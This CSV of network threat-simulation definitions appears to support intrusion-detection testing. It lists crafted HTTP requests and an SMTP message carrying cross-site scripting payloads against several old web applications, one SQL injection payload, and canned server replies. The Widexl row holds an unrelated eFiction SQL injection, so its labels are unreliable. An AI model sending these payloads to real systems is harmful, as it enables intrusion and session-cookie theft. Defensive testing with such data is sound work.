XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿sixcms_xss.xml,SixCMS 6.0 List.PHP Cross-Site Scripting Vulnerability,This threat sends a crafted url to take advantage of a flaw in SixCMS's List.php function which would allow a malicious user to  execute code on the affected site. SixCMS is a web application the typically listens on port 80.,HTTP,TCP,GET /list.php?page=<script>alert(||22 ||XSS||22 ||)</script> HTTP/1.0||0D 0A ||Host||3A || www.targets.org||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
sixcms_xss.xml,SixCMS 6.0 List.PHP Cross-Site Scripting Vulnerability,This threat sends a crafted url to take advantage of a flaw in SixCMS's List.php function which would allow a malicious user to  execute code on the affected site. SixCMS is a web application the typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿sqwebmail_xss.xml,SqWebMail Attachment XSS,"This threat sends an email with a .jpg extension but with a MIME encoding of text/html.  This causes the SqWebMail email application to execute the Javascript contained inside.  This Javascript can be used to create a cross site scripting situation where the attacker can create and delete email without user intervention.  SqWebMail is a web based email application.  This threat targets the SMTP MTA portion of the email delivery, which is typically port 25.",SMTP,TCP,"Message-ID||3A || <430E1FB3.3090905@example.com>||0A ||Date||3A || Thu, 25 Aug 2005 15||3A ||44||3A ||51 -0400||0A ||From||3A || Test <test@example.com>||0A ||MIME-Version||3A || 1.0||0A ||To||3A || Test Two <test2@example.com>||0A ||Subject||3A || here is a picture||0A ||Content-Type||3A || multipart/mixed||3B 0A || boundary=||22 ||------------000705060509080508020102||22 0A 0A ||This is a multi-part message in MIME format.||0A ||--------------000705060509080508020102||0A ||Content-Type||3A || text/plain||3B || charset=ISO-8859-1||3B || format=flowed||0A ||Content-Transfer-Encoding||3A || 7bit||0A 0A 0A ||--------------000705060509080508020102||0A ||Content-Type||3A || text/html||0A ||Content-Transfer-Encoding||3A || binary||0A ||Content-Disposition||3A || attachment||3B || filename=||22 ||image.jpg||22 0A 0A ||<html>||0A ||<body>||0A ||<script>alert(document.domain)||3B ||</script>||0A ||</body>||0A ||</html>||0A 0A ||--------------000705060509080508020102--||0A ||.||0A 0A||"
sqwebmail_xss.xml,SqWebMail Attachment XSS,"This threat sends an email with a .jpg extension but with a MIME encoding of text/html.  This causes the SqWebMail email application to execute the Javascript contained inside.  This Javascript can be used to create a cross site scripting situation where the attacker can create and delete email without user intervention.  SqWebMail is a web based email application.  This threat targets the SMTP MTA portion of the email delivery, which is typically port 25.",SMTP,TCP,220 f||6f ||ster ES||4d ||TP||0d 0a||
sqwebmail_xss.xml,SqWebMail Attachment XSS,"This threat sends an email with a .jpg extension but with a MIME encoding of text/html.  This causes the SqWebMail email application to execute the Javascript contained inside.  This Javascript can be used to create a cross site scripting situation where the attacker can create and delete email without user intervention.  SqWebMail is a web based email application.  This threat targets the SMTP MTA portion of the email delivery, which is typically port 25.",SMTP,TCP,250||2d ||SI||5a ||E 52428800||0d 0a ||250||2d ||PIPE||4c ||I||4e ||I||4e ||G||0d 0a ||250||2d ||AUTH P||4c ||AI||4e || ||4c 4f ||GI||4e 0d 0a||
sqwebmail_xss.xml,SqWebMail Attachment XSS,"This threat sends an email with a .jpg extension but with a MIME encoding of text/html.  This causes the SqWebMail email application to execute the Javascript contained inside.  This Javascript can be used to create a cross site scripting situation where the attacker can create and delete email without user intervention.  SqWebMail is a web based email application.  This threat targets the SMTP MTA portion of the email delivery, which is typically port 25.",SMTP,TCP,250 ||4f 4b 0d 0a||
sqwebmail_xss.xml,SqWebMail Attachment XSS,"This threat sends an email with a .jpg extension but with a MIME encoding of text/html.  This causes the SqWebMail email application to execute the Javascript contained inside.  This Javascript can be used to create a cross site scripting situation where the attacker can create and delete email without user intervention.  SqWebMail is a web based email application.  This threat targets the SMTP MTA portion of the email delivery, which is typically port 25.",SMTP,TCP,250 Accepted||0d 0a||
sqwebmail_xss.xml,SqWebMail Attachment XSS,"This threat sends an email with a .jpg extension but with a MIME encoding of text/html.  This causes the SqWebMail email application to execute the Javascript contained inside.  This Javascript can be used to create a cross site scripting situation where the attacker can create and delete email without user intervention.  SqWebMail is a web based email application.  This threat targets the SMTP MTA portion of the email delivery, which is typically port 25.",SMTP,TCP,354 E||6e ||ter ||6d ||essage||2c || e||6e ||di||6e ||g with ||22 2e 22 || ||6f 6e || a ||6c ||i||6e ||e by itse||6c ||f||0d 0a||
sqwebmail_xss.xml,SqWebMail Attachment XSS,"This threat sends an email with a .jpg extension but with a MIME encoding of text/html.  This causes the SqWebMail email application to execute the Javascript contained inside.  This Javascript can be used to create a cross site scripting situation where the attacker can create and delete email without user intervention.  SqWebMail is a web based email application.  This threat targets the SMTP MTA portion of the email delivery, which is typically port 25.",SMTP,TCP,250 ||4f 4b || id||3d ||1HcVW||6f 2d ||0007YR||2d ||S8
sqwebmail_xss.xml,SqWebMail Attachment XSS,"This threat sends an email with a .jpg extension but with a MIME encoding of text/html.  This causes the SqWebMail email application to execute the Javascript contained inside.  This Javascript can be used to create a cross site scripting situation where the attacker can create and delete email without user intervention.  SqWebMail is a web based email application.  This threat targets the SMTP MTA portion of the email delivery, which is typically port 25.",SMTP,TCP,221 f||6f ||ster c||6c 6f ||si||6e ||g c||6f 6e 6e ||ecti||6f 6e 0d 0a||
﻿tikiwiki_xss.xml,TikiWiki Cross-Site Scripting Vulnerability,allows an attacker to inject arbitrary javascript code which is then executed by the web server. TikiWiki is a web application that typically listens on port 80,HTTP,TCP,GET /tiki-lastchanges.php?days=3&offset=%22%3E%3Cscr%3Cscript%3Eipt%3Ealert('Blwood')%3C/scr%3C/script%3Eipt%3E HTTP/1.1||0D 0A ||Host||3A || www.victim.com||0D 0A ||User-Agent||3A || Links (2.1pre15||3B || Linux 2.6.15.6 i686||3B || 90x34)||0D 0A ||Accept||3A || */*||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
tikiwiki_xss.xml,TikiWiki Cross-Site Scripting Vulnerability,allows an attacker to inject arbitrary javascript code which is then executed by the web server. TikiWiki is a web application that typically listens on port 80,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿tinywebgallery_xss.xml,Tiny Web Gallery XSS vulnerability,This threat sends arbitrary web script or HTML via the twg_album parameter to be executed.Tiny Web Gallery is a web application that typically listens on port 80.,HTTP,TCP,GET /TinyWebGallery/index.php?twg_album=&'><script>alert(document.cookie)</script> HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Links (2.1pre15||3B || Linux 2.6.15.6 i686||3B || 90x34)||0D 0A ||Accept||3A || */*||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
tinywebgallery_xss.xml,Tiny Web Gallery XSS vulnerability,This threat sends arbitrary web script or HTML via the twg_album parameter to be executed.Tiny Web Gallery is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿ultimatehelpdesk_xss.xml,Ultimate HelpDesk Index.ASP Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains a malicious script which is then executed by the server. Ultimate HelpDesk is a web application that typically listens on port 80.,HTTP,TCP,GET /index.asp?status=open&page=tickets&title=39&searchparam=&u_input=&u_field=&intpage=2&keyword=%22%3E%3Cscript%3Ealert%28%27ajann%27%29%3B%3C%2Fscript%3E HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
ultimatehelpdesk_xss.xml,Ultimate HelpDesk Index.ASP Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains a malicious script which is then executed by the server. Ultimate HelpDesk is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿wbblog_xss.xml,WBBlog Cross Site Scripting Vulnerability,"This threat attempts to cause a cross site scripting condition through the Index.php function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. WBBlog is a web application, and typically listens on port 80.",HTTP,TCP,GET /index.php?cmd=viewentry&e_id=||22 ||><script>alert('HACKED')</script> HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
wbblog_xss.xml,WBBlog Cross Site Scripting Vulnerability,"This threat attempts to cause a cross site scripting condition through the Index.php function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. WBBlog is a web application, and typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿widexl_download_tracker_xss.xml,Widexl Download Tracker down.pl ID Variable XSS,This threat sends a crafted URL that contains Javascript which is included in the returned page. Widexl Download Tracker is a web based interface that typically listens on port 80.,HTTP,TCP,"POST /efiction/titles.php?action=viewlist&let='%20UNION%20SELECT%200,0,'<script>alert(document.cookie)</script>',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,penname,0%20FROM%20fanfiction_authors%20/* HTTP/1.0||0D 0A 0D 0A||"
widexl_download_tracker_xss.xml,Widexl Download Tracker down.pl ID Variable XSS,This threat sends a crafted URL that contains Javascript which is included in the returned page. Widexl Download Tracker is a web based interface that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
